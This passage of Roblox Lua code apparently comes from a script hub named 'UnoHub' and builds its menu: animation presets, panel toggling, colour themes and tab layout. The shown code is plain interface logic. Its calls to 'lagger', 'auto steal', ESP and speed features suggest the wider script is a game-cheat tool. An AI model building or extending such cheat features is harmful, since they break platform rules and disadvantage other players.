	run = normalizeAnimValue(preset and (preset.RunAnim or preset.Run)),
	jump = normalizeAnimValue(preset and (preset.JumpAnim or preset.Jump)),
	fall = normalizeAnimValue(preset and (preset.FallAnim or preset.Fall)),
	climb = normalizeAnimValue(preset and (preset.ClimbAnim or preset.Climb)),
	swim = normalizeAnimValue(preset and (preset.Swim or preset.SwimAnim)),
	swimidle = normalizeAnimValue(preset and (preset.SwimIdle or preset.SwimIdleAnim)),
	}
	end
	local animationFieldRefs = {}
	local Anims = {
	idle1    = "rbxassetid://133806214992291",
	idle2    = "rbxassetid://94970088341563",
	walk     = "rbxassetid://707897309",
	run      = "rbxassetid://707861613",
	jump     = "rbxassetid://116936326516985",
	fall     = "rbxassetid://116936326516985",
	climb    = "rbxassetid://116936326516985",
	swim     = "rbxassetid://116936326516985",
	swimidle = "rbxassetid://116936326516985",
	}
	_G.__UnoHub_Anims = Anims
	local animIdToName = {}
	local animNameToId = {}
	for presetName, preset in pairs(animationPresets) do
	local pack = buildAnimPackFromPreset(preset)
	for _, key in ipairs(animationPropertyOrder) do
	local id = pack[key]
	if id then
	local nm = presetName .. " " .. animationPropertyLabels[key]
	if not animNameToId[nm] then
	animNameToId[nm] = id
	animIdToName[id] = nm
	end
	end
	end
	end
	local function animDisplayName(id)
	if not id then return "" end
	if id == "rbxassetid://" then return "Custom" end
	return animIdToName[id] or id
	end
	local slotAnimationList = {}
	for _, key in ipairs(animationPropertyOrder) do slotAnimationList[key] = {} end
	for _, presetName in ipairs(animationPresetOrder) do
	local preset = animationPresets[presetName]
	if preset then
	local pack = buildAnimPackFromPreset(preset)
	for _, key in ipairs(animationPropertyOrder) do
	local id = pack[key]
	if id and not table.find(slotAnimationList[key], id) then
	table.insert(slotAnimationList[key], id)
	end
	end
	end
	end
	local function cycleSlotAnimation(key, box)
	local list = slotAnimationList[key]
	if not list or not box then return end
	local currentId = Anims[key]
	local nextIndex = 1
	for i, id in ipairs(list) do
	if id == currentId then
	nextIndex = i % #list + 1
	break
	end
	end
	Anims[key] = list[nextIndex]
	box.Text = animDisplayName(list[nextIndex])
	saveConfig()
	if toggleStates["Harder Hit Anim"] and saveOriginalAnims then
	local char = Player.Character
	if char then
	saveOriginalAnims(char)
	applyAnimPack(char)
	end
	end
	end
	local selectedAnimationPresetName = animationPresetOrder[1]
	local function applyAnimationPreset(name)
	local preset = animationPresets[name]
	if not preset then return end
	local pack = buildAnimPackFromPreset(preset)
	selectedAnimationPresetName = name
	Anims.idle1 = pack.idle1 or Anims.idle1
	Anims.idle2 = pack.idle2 or Anims.idle2
	Anims.walk = pack.walk or Anims.walk
	Anims.run = pack.run or Anims.run
	Anims.jump = pack.jump or Anims.jump
	Anims.fall = pack.fall or Anims.fall
	Anims.climb = pack.climb or Anims.climb
	Anims.swim = pack.swim or Anims.swim
	Anims.swimidle = pack.swimidle or Anims.swimidle
	if toggleStates["Harder Hit Anim"] and saveOriginalAnims and applyAnimPack then
	local char = Player.Character
	if char then
	saveOriginalAnims(char)
	applyAnimPack(char)
	end
	end
	end
	local function loadAnimationPresetIntoFields(name)
	local preset = animationPresets[name]
	if not preset then return end
	local pack = buildAnimPackFromPreset(preset)
	for _, key in ipairs(animationPropertyOrder) do
	local box = animationFieldRefs[key]
	if box then
	local value = pack[key] or ""
	box.Text = animDisplayName(value)
	end
	end
	applyAnimationPreset(name)
	end
	makeToggleNoKeybind(animationsSection, "Animations (Master)", "Animations")
	FeaturePostToggle["Animations"] = function(active)

	if toggleStates["Harder Hit Anim"] == active then return end
	toggleStates["Harder Hit Anim"] = active
	if FeaturePostToggle["Harder Hit Anim"] then FeaturePostToggle["Harder Hit Anim"](active) end
	if toggleVisualUpdaters["Harder Hit Anim"] then toggleVisualUpdaters["Harder Hit Anim"]() end
	saveConfig()
	end

	local presetButton = Instance.new("TextButton", animationsSection)
	presetButton.Size = UDim2.new(1, 0, 0, 34)
	presetButton.BackgroundColor3 = Color3.fromRGB(22, 22, 28)
	presetButton.BorderSizePixel = 0
	presetButton.Text = "Preset: " .. selectedAnimationPresetName
	presetButton.TextColor3 = Color3.fromRGB(255, 255, 255)
	presetButton.TextSize = 11
	presetButton.Font = Enum.Font.GothamBold
	presetButton.AutoButtonColor = false
	Instance.new("UICorner", presetButton).CornerRadius = UDim.new(0, 8)
	connectBtn(presetButton, function()
	local currentIndex = 1
	for i, name in ipairs(animationPresetOrder) do
	if name == selectedAnimationPresetName then
	currentIndex = i
	break
	end
	end
	local nextIndex = currentIndex + 1
	if nextIndex > #animationPresetOrder then nextIndex = 1 end
	local nextName = animationPresetOrder[nextIndex]
	presetButton.Text = "Preset: " .. nextName
	loadAnimationPresetIntoFields(nextName)
	saveConfig()
	end)

	local fieldsContainer = Instance.new("Frame", animationsSection)
	fieldsContainer.Size = UDim2.new(1, -2, 0, 0)
	fieldsContainer.BackgroundTransparency = 1
	fieldsContainer.ClipsDescendants = false
	local fieldLayout = Instance.new("UIListLayout", fieldsContainer)
	fieldLayout.Padding = UDim.new(0, 6)
	fieldLayout.SortOrder = Enum.SortOrder.LayoutOrder
	fieldLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
	fieldsContainer.Size = UDim2.new(1, -2, 0, fieldLayout.AbsoluteContentSize.Y)
	end)

	for _, key in ipairs(animationPropertyOrder) do
	local row = Instance.new("Frame", fieldsContainer)
	row.Size = UDim2.new(1, 0, 0, 30)
	row.BackgroundColor3 = Color3.fromRGB(16, 16, 20)
	row.BackgroundTransparency = 0.25
	row.BorderSizePixel = 0
	Instance.new("UICorner", row).CornerRadius = UDim.new(0, 8)

	local label = Instance.new("TextLabel", row)
	label.Size = UDim2.new(0.48, 0, 1, 0)
	label.Position = UDim2.new(0, 8, 0, 0)
	label.BackgroundTransparency = 1
	label.Text = animationPropertyLabels[key]
	label.TextColor3 = Color3.fromRGB(220, 220, 230)
	label.TextSize = 11
	label.Font = Enum.Font.GothamBold
	label.TextXAlignment = Enum.TextXAlignment.Left

	local input = Instance.new("TextButton", row)
	input.Size = UDim2.new(0.5, -10, 0, 20)
	input.Position = UDim2.new(0.5, 0, 0.5, -10)
	input.BackgroundColor3 = Color3.fromRGB(20, 20, 24)
	input.BorderSizePixel = 0
	input.Text = ""
	input.TextColor3 = Color3.fromRGB(255, 255, 255)
	input.TextSize = 10
	input.Font = Enum.Font.Gotham
	input.AutoButtonColor = false
	Instance.new("UICorner", input).CornerRadius = UDim.new(0, 6)

	input.Activated:Connect(function()
	cycleSlotAnimation(key, input)
	end)
	animationFieldRefs[key] = input
	end

	local infoLabel = Instance.new("TextLabel", animationsSection)
	infoLabel.Size = UDim2.new(1, 0, 0, 24)
	infoLabel.BackgroundTransparency = 1
	infoLabel.Text = "Master: turn all animations on or off. Click an animation to cycle to the next one."
	infoLabel.TextColor3 = Color3.fromRGB(140, 180, 220)
	infoLabel.TextSize = 10
	infoLabel.Font = Enum.Font.Gotham
	infoLabel.TextXAlignment = Enum.TextXAlignment.Left

	loadAnimationPresetIntoFields(selectedAnimationPresetName)
	if _G.__savedAnimations then
	for k, savedVal in pairs(_G.__savedAnimations) do
	if Anims[k] ~= nil then
	Anims[k] = savedVal
	local box = animationFieldRefs[k]
	if box then box.Text = animDisplayName(savedVal) end
	end
	end
	_G.__savedAnimations = nil
	end

    local toggleBtn = nil
    _G.__toggleBtn = nil

	local panelScale = Instance.new("UIScale", Panel)
	panelScale.Scale = 1

	local panelVisible = toggleStates["Toggle UI"] ~= false
	if type(_G.__UnoPanelVisible) == "boolean" then
	panelVisible = _G.__UnoPanelVisible
	end
	if toggleStates["Toggle UI"] ~= panelVisible then toggleStates["Toggle UI"] = panelVisible end
	if toggleVisualUpdaters["Toggle UI"] then toggleVisualUpdaters["Toggle UI"]() end

	local _panelAnimating = false
	local _toggleUIDebounce = false
	local miniPanel = nil
	local miniSubtitle = nil
	function setPanelVisible(show)
	show = show == true
	_G.__UnoPanelVisible = show
	toggleStates["Toggle UI"] = show
	if Panel.Visible == show then
	panelVisible = show
	if miniPanel then miniPanel.Visible = not show end
	if miniSubtitle then miniSubtitle.Visible = not show end
	saveConfig()
	return
	end
	if _panelAnimating or _toggleUIDebounce then return end

	_toggleUIDebounce = true
	task.delay(0.3, function() _toggleUIDebounce = false end)
	panelVisible = show
	if show then
	Panel.Visible = true
	if miniPanel then miniPanel.Visible = false end
	if miniSubtitle then miniSubtitle.Visible = false end
	panelScale.Scale = 0.92
	Panel.BackgroundTransparency = 0.2
	TweenService:Create(panelScale, TweenInfo.new(0.22, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Scale = 1}):Play()
	TweenService:Create(Panel, TweenInfo.new(0.18, Enum.EasingStyle.Quad), {BackgroundTransparency = 0.2}):Play()
	else
	_panelAnimating = true
	TweenService:Create(panelScale, TweenInfo.new(0.16, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {Scale = 0.9}):Play()
	TweenService:Create(Panel, TweenInfo.new(0.16, Enum.EasingStyle.Quad), {BackgroundTransparency = 0.8}):Play()
	task.delay(0.16, function()
	Panel.Visible = false
	if miniPanel then miniPanel.Visible = true end
	if miniSubtitle then miniSubtitle.Visible = true end
	panelScale.Scale = 1
	Panel.BackgroundTransparency = 0.95
	_panelAnimating = false
	end)
	end
	if toggleVisualUpdaters["Toggle UI"] then toggleVisualUpdaters["Toggle UI"]() end
	saveConfig()
	end

	Panel.Visible = false
	_G.__setPanelVisible = setPanelVisible

	FeatureToggles["Toggle UI"] = function()

	setPanelVisible(not Panel.Visible)
	end

	savedMenuPos = _G["_UnoHub_UI_MenuPos"]
	if savedMenuPos then
	local placedMenuPos = Vector2.new(placeInsideViewport(Panel, 0, savedMenuPos.x, 0, savedMenuPos.y))
	Panel.Position = UDim2.new(0, placedMenuPos.X, 0, placedMenuPos.Y)
	else
	Panel.Position = UDim2.new(1, -PANEL_W - 20, 0.5, -PANEL_H/2)
	end

	Panel.Visible = false
	toggleStates["Toggle UI"] = panelVisible
	_G.__UnoPanelVisible = panelVisible
	if miniPanel then miniPanel.Visible = not panelVisible end
	if miniSubtitle then miniSubtitle.Visible = not panelVisible end

	;(function()
	_G.__UnoModernGuiActive = true
	local themesPanel = ScreenGui:FindFirstChild("MainThemesPanel")
	if themesPanel then themesPanel:Destroy() end

	if FPSLabel then FPSLabel.Parent = ScreenGui end
	if PingLabel then PingLabel.Parent = ScreenGui end
	for _, child in ipairs(Panel:GetChildren()) do
	if child ~= panelScale then child:Destroy() end
	end
	if panelScale then panelScale.Scale = 1 end
	if toggleBtn then toggleBtn:Destroy(); toggleBtn = nil; _G.__toggleBtn = nil end
	if miniPanel then pcall(function() miniPanel:Destroy() end); miniPanel = nil; miniSubtitle = nil end

	Panel.Name = "UnoModernPanel"
	local MODERN = {
	headerH = isMobile and 72 or 84,
	pageGap = isMobile and 4 or 6,
	sectionH = isMobile and 18 or 22,
	inputH = isMobile and 30 or 36,
	toggleH = isMobile and 30 or 38,
	toggleBindH = isMobile and 40 or 50,
	actionH = isMobile and 34 or 42,
	textSize = isMobile and 9 or 11,
	categoryH = isMobile and 28 or 34,
	}
	local modernViewport = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or vp
	local modernPanelW = isMobile and math.clamp(math.floor(modernViewport.X * 0.62), 250, 310) or 360
	local modernPanelH = isMobile and math.clamp(math.floor(modernViewport.Y * 0.82), 430, 580) or 640
	Panel.Size = UDim2.new(0, modernPanelW, 0, modernPanelH)
	local savedModernPosition = _G["_UnoHub_UI_MenuPos"]
	if savedModernPosition and savedModernPosition.x ~= nil and savedModernPosition.y ~= nil then
	Panel.Position = UDim2.new(savedModernPosition.xs or 0, savedModernPosition.x, savedModernPosition.ys or 0, savedModernPosition.y)
	else
	Panel.Position = UDim2.new(1, -modernPanelW - 12, 0.5, -modernPanelH / 2)
	end
	Panel.BackgroundTransparency = 1
	Panel.BorderSizePixel = 0
	Panel.ClipsDescendants = false
	Panel.Visible = panelVisible

	local CURT_WORD_IMAGE = "rbxassetid://73914270916433"
	local CURT_THEME_PRESETS = {
		-- UNO Christmas: pine green, festive red and warm gold.
		[1] = {
			bg = Color3.fromRGB(5, 17, 12),
			bgDark = Color3.fromRGB(2, 9, 6),
			row = Color3.fromRGB(12, 34, 23),
			accent = Color3.fromRGB(196, 48, 57),
			accentDim = Color3.fromRGB(105, 27, 35),
			activeRow = Color3.fromRGB(67, 23, 29),
			text = Color3.fromRGB(255, 250, 237),
			textDim = Color3.fromRGB(239, 211, 155),
			textMuted = Color3.fromRGB(164, 190, 166),
			divider = Color3.fromRGB(37, 75, 53),
		},
		[2] = {
			bg = Color3.fromRGB(17, 7, 9),
			bgDark = Color3.fromRGB(8, 3, 5),
			row = Color3.fromRGB(37, 13, 17),
			accent = Color3.fromRGB(220, 177, 91),
			accentDim = Color3.fromRGB(112, 75, 34),
			activeRow = Color3.fromRGB(78, 29, 34),
			text = Color3.fromRGB(255, 250, 237),
			textDim = Color3.fromRGB(241, 215, 164),
			textMuted = Color3.fromRGB(190, 151, 125),
			divider = Color3.fromRGB(82, 43, 37),
		},
		[3] = {
			bg = Color3.fromRGB(7, 14, 20),
			bgDark = Color3.fromRGB(2, 7, 12),
			row = Color3.fromRGB(14, 27, 37),
			accent = Color3.fromRGB(180, 215, 224),
			accentDim = Color3.fromRGB(57, 91, 105),
			activeRow = Color3.fromRGB(26, 57, 69),
			text = Color3.fromRGB(250, 253, 255),
			textDim = Color3.fromRGB(205, 229, 236),
			textMuted = Color3.fromRGB(139, 174, 188),
			divider = Color3.fromRGB(38, 66, 78),
		},
	}
	local WINTER_THEME = {
		bg = Color3.fromRGB(5, 17, 12),
		bgDark = Color3.fromRGB(2, 9, 6),
		row = Color3.fromRGB(12, 34, 23),
		accent = Color3.fromRGB(220, 177, 91),
		accentDim = Color3.fromRGB(112, 75, 34),
		activeRow = Color3.fromRGB(67, 23, 29),
		text = Color3.fromRGB(255, 250, 237),
		textDim = Color3.fromRGB(239, 211, 155),
		textMuted = Color3.fromRGB(164, 190, 166),
		divider = Color3.fromRGB(37, 75, 53),
	}
	local function getCurtThemePreset(index)
		return CURT_THEME_PRESETS[tonumber(index) or 1] or CURT_THEME_PRESETS[1]
	end
	local _initialCurtTheme = getCurtThemePreset(bgIndex)
	local C = {
	bg = _initialCurtTheme.bg,
	bgDark = _initialCurtTheme.bgDark,
	row = _initialCurtTheme.row,
	accent = _initialCurtTheme.accent,
	accentDim = _initialCurtTheme.accentDim,
	activeRow = _initialCurtTheme.activeRow,
	text = _initialCurtTheme.text,
	textDim = _initialCurtTheme.textDim,
	textMuted = _initialCurtTheme.textMuted,
	divider = _initialCurtTheme.divider,
	}
	local function corner(parent, radius)
	local item = Instance.new("UICorner")
	item.CornerRadius = UDim.new(0, radius or 10)
	item.Parent = parent
	return item
	end
	local function stroke(parent, color, thickness)
	local item = Instance.new("UIStroke")
	item.Color = color or C.divider
	item.Thickness = thickness or 1
	item.Parent = parent
	return item
	end

	local activeUiTweens = setmetatable({}, { __mode = "k" })
	local function tween(object, properties, duration, easingStyle, easingDirection)
	if not object or not object.Parent then return nil end
	local previous = activeUiTweens[object]
	if previous then pcall(function() previous:Cancel() end) end
	local animation = TweenService:Create(object, TweenInfo.new(
	duration or 0.16,
	easingStyle or Enum.EasingStyle.Quart,
	easingDirection or Enum.EasingDirection.Out
	), properties)
	activeUiTweens[object] = animation
	animation:Play()
	return animation
	end
	local function makeDraggable(handle, target)
	local dragging, dragInput, dragStart, startPosition = false, nil, nil, nil
	handle.Active = true
	_G.__UnoGuiPositionResetters[target.Name] = function()
	dragging = false
	dragInput = nil
	dragStart = nil
	startPosition = nil
	target.Position = UDim2.fromOffset(6, 54)
	if target == Panel then
	_G["_UnoHub_UI_MenuPos"] = nil
	else
	_G["_UnoHub_UI_ModernMiniPos"] = nil
	end
	end
	handle.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
	if dragging then return end
	dragInput = input
	dragging = true; dragStart = input.Position; startPosition = target.Position
	input.Changed:Connect(function()
	if input.UserInputState == Enum.UserInputState.End then
	dragging = false
	if target == Panel then
	_G["_UnoHub_UI_MenuPos"] = {
	x = target.Position.X.Offset,
	y = target.Position.Y.Offset,
	xs = target.Position.X.Scale,
	ys = target.Position.Y.Scale,
	}
	pcall(saveConfig)
	elseif target.Name == "UnoRestoreButton" then
	_G["_UnoHub_UI_ModernMiniPos"] = {
	x = target.Position.X.Offset,
	y = target.Position.Y.Offset,
	}
	pcall(saveConfig)
	end
	end
	end)
	end
	end)
	handle.InputChanged:Connect(function(input)
	if dragging and dragInput.UserInputType ~= Enum.UserInputType.Touch and input.UserInputType == Enum.UserInputType.MouseMovement then dragInput = input end
	end)

	_G.__UnoTrackConn(UserInputService.InputChanged:Connect(function(input)
	if dragging and input == dragInput then
	local delta = input.Position - dragStart
	placeInsideViewport(target, startPosition.X.Scale, startPosition.X.Offset + delta.X, startPosition.Y.Scale, startPosition.Y.Offset + delta.Y)
	end
	end))
	end

	local inner = Instance.new("Frame")
	inner.Name = "Inner"
	inner.Size = UDim2.new(1, 0, 1, 0)
	inner.BackgroundColor3 = C.bg
	inner.BorderSizePixel = 0
	inner.ClipsDescendants = true
	inner.Parent = Panel
	corner(inner, 12)
	local innerStroke = stroke(inner, Color3.fromRGB(45, 45, 45), 0)

	local background = Instance.new("ImageLabel")
	background.Name = "BackgroundImage"
	background.Size = UDim2.new(1, -2, 1, -2)
	background.Position = UDim2.fromOffset(1, 1)
	background.BackgroundTransparency = 1
	local GUI_THEME_IMAGES = { ["GUI 1"] = "" }
	local GUI_THEME_PANEL_BACKGROUND = { ["GUI 1"] = 1 }
	local activeGuiTheme = "GUI 1"
	_G.__UnoGuiTheme = activeGuiTheme
	local refreshCategoryTextColors
	local function syncGuiThemeToPanels(themeName)
		local backgroundIndex = GUI_THEME_PANEL_BACKGROUND[themeName] or 1
		pcall(function()
			if _G.UnoLagger and _G.UnoLagger.SetBackground then
				_G.UnoLagger.SetBackground(backgroundIndex)
			end
		end)
	end
	local mainShade = _G.__UnoAddUnifiedPanelShade(inner, 12, 1)
	for _, extraName in ipairs({"UnifiedPanelWhiteOutline", "UnifiedPanelWhiteGlow"}) do
		local extra = inner:FindFirstChild(extraName)
		if extra then extra:Destroy() end
	end
	if mainShade then
		mainShade.Position = UDim2.fromOffset(1, 1)
		mainShade.Size = UDim2.new(1, -2, 1, -2)
		local shadeCorner = mainShade:FindFirstChildOfClass("UICorner")
		if shadeCorner then shadeCorner.CornerRadius = UDim.new(0, 11) end
	end
	local function applyGuiTheme(themeName)
	if not GUI_THEME_IMAGES[themeName] then themeName = "GUI 1" end
	activeGuiTheme = themeName
	_G.__UnoGuiTheme = themeName
	if _G.__UnoApplyTheme then _G.__UnoApplyTheme() end
	background.Image = GUI_THEME_IMAGES[themeName]
	local backgroundShade = inner:FindFirstChild("UnifiedBackgroundShade")
	if backgroundShade then backgroundShade.Visible = themeName ~= "GUI 1" end
	innerStroke.Transparency = 1
	syncGuiThemeToPanels(themeName)
	if _G.__UnoApplyAutoStealBarTheme then
	pcall(_G.__UnoApplyAutoStealBarTheme, themeName)
	end
	if _G.__UnoRefreshESPTheme then
	pcall(_G.__UnoRefreshESPTheme, _G.__UnoThemeAccent, Color3.fromRGB(0, 0, 0))
	end
	if _G.__refreshSpeedBillboards then
	pcall(_G.__refreshSpeedBillboards)
	end
	if refreshCategoryTextColors then refreshCategoryTextColors() end
	end
	applyGuiTheme(activeGuiTheme)
	background.ImageTransparency = 0
	background.ScaleType = Enum.ScaleType.Crop
	-- sync color-theme backgrounds (red/pink/blue)
	do
		local bi = tonumber(_G["_UnoHub_UI_BgIndex"]) or 1
		if backgroundIds and backgroundIds[bi] and backgroundIds[bi] ~= "" then
			background.Image = backgroundIds[bi]
		end
		if _G.__UnoApplyMainBgFrame then pcall(_G.__UnoApplyMainBgFrame, background, bi) end
	end
	background.ZIndex = 0
	background.Parent = inner
	background.Visible = true
	corner(background, 11)

	local header = Instance.new("Frame")
	header.Name = "HeaderFrame"
	header.Size = UDim2.new(1, 0, 0, MODERN.headerH)
	header.BackgroundTransparency = 1
	header.ZIndex = 10
	header.Parent = inner
	makeDraggable(header, Panel)

	local statsPanel = Instance.new("Frame")
	statsPanel.Name = "HeaderStats"
	statsPanel.Position = UDim2.new(0, 14, 0, 8)
	statsPanel.Size = UDim2.new(0, 78, 0, 40)
	statsPanel.BackgroundColor3 = C.bgDark
	statsPanel:SetAttribute("CurtThemeRole", "BgDark")
	statsPanel.BackgroundTransparency = 0.35
	statsPanel.BorderSizePixel = 0
	statsPanel.ZIndex = 12
	statsPanel.Parent = header
	statsPanel.Visible = false
	corner(statsPanel, 8)
	stroke(statsPanel, Color3.fromRGB(45, 45, 45), 1)

	if FPSLabel then
	FPSLabel.Parent = statsPanel
	FPSLabel.Position = UDim2.new(0, 7, 0, 3)
	FPSLabel.Size = UDim2.new(1, -14, 0, 16)
	FPSLabel.BackgroundTransparency = 1
	FPSLabel.TextColor3 = C.text
	FPSLabel.TextSize = 9
	FPSLabel.Font = Enum.Font.GothamBold
	FPSLabel.TextXAlignment = Enum.TextXAlignment.Left
	FPSLabel.TextTransparency = 0
	FPSLabel.Visible = false
	FPSLabel.ZIndex = 13
	end
	if PingLabel then
	PingLabel.Parent = statsPanel
	PingLabel.Position = UDim2.new(0, 7, 0, 20)
	PingLabel.Size = UDim2.new(1, -14, 0, 16)
	PingLabel.BackgroundTransparency = 1
	PingLabel.TextColor3 = C.textDim
	PingLabel.TextSize = 9
	PingLabel.Font = Enum.Font.GothamBold
	PingLabel.TextXAlignment = Enum.TextXAlignment.Left
	PingLabel.TextTransparency = 0
	PingLabel.Visible = false
	PingLabel.ZIndex = 13
	end

	local title = Instance.new("TextLabel")
	title.Position = UDim2.new(0, 98, 0, 8)
	title.Size = UDim2.new(1, -146, 0, 22)
	title.BackgroundTransparency = 1
	title.Text = "h/yeju"
	title.TextColor3 = C.text
	title.TextSize = 17
	title.Font = Enum.Font.GothamBlack
	title.TextXAlignment = Enum.TextXAlignment.Center
	title.ZIndex = 11
	title.Parent = header

	local subtitle = Instance.new("TextLabel")
	subtitle.Position = UDim2.new(0, 98, 0, 32)
	subtitle.Size = UDim2.new(1, -146, 0, 14)
	subtitle.BackgroundTransparency = 1
	subtitle.Text = ""
	subtitle.TextColor3 = C.textDim
	subtitle.TextSize = 10
	subtitle.Font = Enum.Font.GothamBold
	subtitle.TextXAlignment = Enum.TextXAlignment.Center
	subtitle.ZIndex = 11
	subtitle.Parent = header
	subtitle.Visible = false

	local wordMark = Instance.new("ImageLabel")
	wordMark.Name = "CurtWordMark"
	wordMark.AnchorPoint = Vector2.new(0.5, 0.5)
	wordMark.Position = UDim2.new(0.5, 0, 0.5, 0)
	wordMark.Size = UDim2.fromOffset(isMobile and 380 or 480, isMobile and 100 or 124)
	wordMark.BackgroundTransparency = 1
	wordMark.Image = CURT_WORD_IMAGE
	wordMark.ScaleType = Enum.ScaleType.Fit
	wordMark.ImageColor3 = C.accent
	wordMark.ZIndex = 13
	wordMark.Parent = header

	local wordGlow = Instance.new("ImageLabel")
	wordGlow.Name = "CurtWordGlow"
	wordGlow.AnchorPoint = Vector2.new(0.5, 0.5)
	wordGlow.Position = UDim2.new(0.5, 0, 0.5, 0)
	wordGlow.Size = UDim2.fromOffset(isMobile and 400 or 500, isMobile and 108 or 134)
	wordGlow.BackgroundTransparency = 1
	wordGlow.Image = CURT_WORD_IMAGE
	wordGlow.ImageTransparency = 0.74
	wordGlow.ScaleType = Enum.ScaleType.Fit
	wordGlow.ZIndex = 12
	wordGlow.Parent = header

	local closeButton = Instance.new("TextButton")
	closeButton.Size = UDim2.new(0, 28, 0, 28)
	closeButton.Position = UDim2.new(1, -38, 0, 8)
	closeButton.BackgroundColor3 = C.bgDark
	closeButton:SetAttribute("CurtThemeRole", "BgDark")
	closeButton.BorderSizePixel = 0
	closeButton.Text = "-"
	closeButton.TextColor3 = C.textMuted
	closeButton.Font = Enum.Font.GothamBlack
	closeButton.TextSize = 22
	closeButton.ZIndex = 12
	closeButton.Parent = header
	corner(closeButton, 6)
	stroke(closeButton, Color3.fromRGB(45, 45, 45), 1)

	local separator = Instance.new("Frame")
	separator.Position = UDim2.new(0, 14, 0, MODERN.headerH)
	separator.Size = UDim2.new(1, -28, 0, 1)
	separator.BackgroundColor3 = C.accent
	separator:SetAttribute("CurtThemeRole", "Accent")
	separator.BackgroundTransparency = 0.7
	separator.BorderSizePixel = 0
	separator.ZIndex = 9
	separator.Parent = inner

	local categoryPanel = Instance.new("Frame")
	categoryPanel.Name = "LeftPanel"
	categoryPanel.Size = UDim2.new(0, 85, 1, -78)
	categoryPanel.Position = UDim2.new(1, -85, 0, 68)
	categoryPanel.BackgroundColor3 = C.bgDark
	categoryPanel:SetAttribute("CurtThemeRole", "BgDark")
	categoryPanel.BackgroundTransparency = 0.5
	categoryPanel.BorderSizePixel = 0
	categoryPanel.ZIndex = 5
	categoryPanel.Parent = inner
	corner(categoryPanel, 12)
	categoryPanel.Visible = false

	title.Text = ""
	title.Visible = false

	local bottomTabsH = isMobile and 40 or 48
	local bottomTabs = Instance.new("Frame")
	bottomTabs.Name = "BottomTabs"
	bottomTabs.Size = UDim2.new(1, -12, 0, bottomTabsH)
	bottomTabs.Position = UDim2.new(0, 6, 1, -(bottomTabsH + 6))
	bottomTabs.BackgroundColor3 = C.bgDark
	bottomTabs:SetAttribute("CurtThemeRole", "BgDark")
	bottomTabs.BackgroundTransparency = 1
	bottomTabs.BorderSizePixel = 0
	bottomTabs.ZIndex = 10
	bottomTabs.Parent = inner
	corner(bottomTabs, 8)
	local bottomTabsStroke = stroke(bottomTabs, C.divider, 1)
	bottomTabsStroke.Transparency = 1

	local categoryList = Instance.new("Frame")
	categoryList.Size = UDim2.new(1, -12, 1, -8)
	categoryList.Position = UDim2.new(0, 6, 0, 4)
	categoryList.BackgroundTransparency = 1
	categoryList.ZIndex = 12
	categoryList.Parent = bottomTabs
	local categoryLayout = Instance.new("UIListLayout", categoryList)
	categoryLayout.SortOrder = Enum.SortOrder.LayoutOrder
	categoryLayout.FillDirection = Enum.FillDirection.Horizontal
	categoryLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
	categoryLayout.VerticalAlignment = Enum.VerticalAlignment.Center
	categoryLayout.Padding = UDim.new(0, isMobile and 2 or 4)
	local categoryPadding = Instance.new("UIPadding", categoryList)
	categoryPadding.PaddingLeft = UDim.new(0, 0)
	categoryPadding.PaddingRight = UDim.new(0, 0)
	categoryPadding.PaddingTop = UDim.new(0, 0)

	local content = Instance.new("Frame")
	content.Name = "ContentFrame"
	content.Size = UDim2.new(1, -12, 1, -(MODERN.headerH + bottomTabsH + 20))
	content.Position = UDim2.new(0, 6, 0, MODERN.headerH + 8)
	content.BackgroundTransparency = 1
	content.ClipsDescendants = true
	content.ZIndex = 4
	content.Parent = inner

	local function setTabPosition(position)
		position = position == "Left" and "Left" or "Down"
		_G.__UnoTabPosition = position
		local isLeft = position == "Left"
		if isLeft then
			bottomTabs.Size = UDim2.new(0, isMobile and 74 or 88, 1, -(MODERN.headerH + 14))
			bottomTabs.Position = UDim2.new(0, 6, 0, MODERN.headerH + 8)
			-- Keep only a subtle dark backdrop behind the floating left tabs.
			bottomTabs.BackgroundTransparency = 0.82
			bottomTabsStroke.Transparency = 0.82
			categoryList.Size = UDim2.new(1, -8, 1, -8)
			categoryList.Position = UDim2.new(0, 4, 0, 4)
			categoryPadding.PaddingTop = UDim.new(0, isMobile and 4 or 8)
			categoryLayout.FillDirection = Enum.FillDirection.Vertical
			categoryLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
			categoryLayout.VerticalAlignment = Enum.VerticalAlignment.Top
			categoryLayout.Padding = UDim.new(0, isMobile and 3 or 4)
			content.Size = UDim2.new(1, -(isMobile and 86 or 102), 1, -(MODERN.headerH + 14))
			content.Position = UDim2.new(0, isMobile and 80 or 96, 0, MODERN.headerH + 8)
		else
			bottomTabs.Size = UDim2.new(1, -12, 0, bottomTabsH)
			bottomTabs.Position = UDim2.new(0, 6, 1, -(bottomTabsH + 6))
			bottomTabs.BackgroundTransparency = 1
			bottomTabsStroke.Transparency = 1
			categoryList.Size = UDim2.new(1, -12, 1, -8)
			categoryList.Position = UDim2.new(0, 6, 0, 4)
			categoryLayout.FillDirection = Enum.FillDirection.Horizontal
			categoryLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
			categoryLayout.VerticalAlignment = Enum.VerticalAlignment.Center
			categoryLayout.Padding = UDim.new(0, isMobile and 2 or 4)
			content.Size = UDim2.new(1, -12, 1, -(MODERN.headerH + bottomTabsH + 20))
			content.Position = UDim2.new(0, 6, 0, MODERN.headerH + 8)
		end
		for _, button in ipairs(categoryList:GetChildren()) do
			if button:IsA("TextButton") then
				button.Size = isLeft
					and UDim2.new(1, -4, 0, isMobile and 34 or 38)
					or UDim2.new(0.25, isMobile and -2 or -4, 0, MODERN.categoryH)
				button.TextWrapped = isLeft
			end
		end
		for _, object in ipairs(content:GetDescendants()) do
			if (object:IsA("TextLabel") or object:IsA("TextButton") or object:IsA("TextBox"))
				and object.Parent and object.Parent:GetAttribute("CurtThemeRole") == "Row" then
				object.TextWrapped = true
				object.TextSize = MODERN.textSize
			end
		end
		pcall(saveConfig)
		return position
	end
	_G.__UnoSetTabPosition = setTabPosition

	local function keepOriginalText(object)
	object:SetAttribute("UnoKeepBlackText", true)
	object.TextStrokeTransparency = 1
	return object
	end
	for _, object in ipairs(inner:GetDescendants()) do
	if object:IsA("TextLabel") or object:IsA("TextButton") or object:IsA("TextBox") then
	keepOriginalText(object)
	end
	end
